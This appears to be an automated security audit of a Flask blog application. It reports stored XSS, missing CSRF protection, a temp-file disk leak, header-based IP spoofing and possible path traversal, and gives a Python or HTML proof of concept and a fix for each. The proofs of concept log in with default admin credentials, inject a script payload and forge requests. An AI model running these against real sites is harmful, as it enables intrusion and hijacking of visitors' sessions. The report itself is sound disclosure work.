====

Auto Security Analysis of blog-eletrix-fr at 2026-03-02

MEDIUM - Stored Cross-Site Scripting (XSS)
The application allows users to create blog posts with arbitrary content. This content is then rendered using the `|safe` filter in `post.html`, and the `markdown2.markdown()` function does not appear to be configured to sanitize HTML. An attacker with access to the `create_post` route (or via CSRF) can inject malicious JavaScript that will execute in the context of any user viewing the post.

PoC
```python
import urllib.request
import urllib.parse
import http.cookiejar

# Note: Requires admin login or CSRF
cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

# Login (default credentials)
login_data = urllib.parse.urlencode({'username': 'admin', 'password': 'admin'}).encode()
opener.open("http://127.0.0.1:5000/login", login_data)

# Create post with XSS payload
xss_payload = "<script>alert('XSS')</script>"
post_data = urllib.parse.urlencode({
    'title': 'XSS_Test',
    'author': 'Hacker',
    'tags': 'test',
    'content': xss_payload
}).encode()
opener.open("http://127.0.0.1:5000/create_post", post_data)

# Verify payload is rendered without escaping
response = opener.open("http://127.0.0.1:5000/post/XSS_Test")
if xss_payload in response.read().decode():
    print("Stored XSS Verified")
```

Fix
Remove the `|safe` filter from `html/post.html` or use a library like `bleach` to sanitize the HTML output of `markdown2`.

====

MEDIUM - Missing CSRF Protection
The application does not implement any Cross-Site Request Forgery (CSRF) protection on state-changing routes such as `/login`, `/create_post`, and `/upload`. This allows an attacker to perform actions on behalf of a logged-in user if they can trick the user into visiting a malicious website.

PoC
```python
# A simple HTML form on a malicious site can trigger a post creation:
# <form action="http://[target]/create_post" method="POST">
#   <input type="hidden" name="title" value="CSRF_Post">
#   <input type="hidden" name="author" value="Attacker">
#   <input type="hidden" name="tags" value="csrf">
#   <input type="hidden" name="content" value="Created via CSRF">
#   <input type="submit" value="Click me">
# </form>
```

Fix
Implement `Flask-WTF` and use the `CSRFProtect` extension to add CSRF tokens to all forms and verify them on the server side.

====

LOW - Denial of Service (DoS) / Temporary File Leakage
The `/upload` route saves uploaded files to a temporary directory before processing them. If the file is not a valid image, the `utils.add_watermark` function (which uses Pillow) will raise an exception. The application does not catch this exception to delete the temporary file, leading to a build-up of files in `./temp_uploads/` and potentially filling up disk space.

PoC
```python
import urllib.request
import http.cookiejar

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
login_data = urllib.parse.urlencode({'username': 'admin', 'password': 'admin'}).encode()
opener.open("http://127.0.0.1:5000/login", login_data)

boundary = '----Boundary'
data = [f'--{boundary}', 'Content-Disposition: form-data; name="file"; filename="test.txt"', 'Content-Type: text/plain', '', 'Not an image', f'--{boundary}--', '']
payload = '\r\n'.join(data).encode()
req = urllib.request.Request("http://127.0.0.1:5000/upload/", data=payload)
req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')

try:
    opener.open(req)
except:
    pass # Expected failure

# Check ./temp_uploads/ for 'test.txt'
```

Fix
Use a `try...finally` block to ensure that temporary files are deleted regardless of whether processing succeeds or fails.

====

LOW - IP Spoofing via Untrusted Header
The application trusts the `CF-Real-IP` header to determine the user's IP address. This header can be easily spoofed by an attacker unless the application is behind a correctly configured Cloudflare proxy that strips this header from incoming requests.

PoC
```python
import urllib.request
req = urllib.request.Request("http://127.0.0.1:5000/")
req.add_header('CF-Real-IP', '1.2.3.4')
urllib.request.urlopen(req)
# The application now thinks the user's IP is 1.2.3.4
```

Fix
Only trust headers like `CF-Real-IP` or `X-Forwarded-For` if the request comes from a known, trusted proxy IP address.

====

LOW - Potential Path Traversal
The `/post/<name>` route uses `os.path.join` with the user-provided `name` parameter without sanitization. While Flask's default routing for `<name>` usually prevents slashes, any misconfiguration or use of a different dispatcher could expose files outside the `articles` directory.

PoC
```python
# Theoretically:
# http://[target]/post/..%2f..%2fetc%2fpasswd
# (May be blocked by Flask/Web server in default configurations)
```

Fix
Use `werkzeug.utils.secure_filename` or verify that the resulting path is still within the intended directory.

====

Summary:
| Severity | Exploit Name |
|----------|--------------|
| MEDIUM   | Stored Cross-Site Scripting (XSS) |
| MEDIUM   | Missing CSRF Protection |
| LOW      | Denial of Service (DoS) / Temporary File Leakage |
| LOW      | IP Spoofing via Untrusted Header |
| LOW      | Potential Path Traversal |
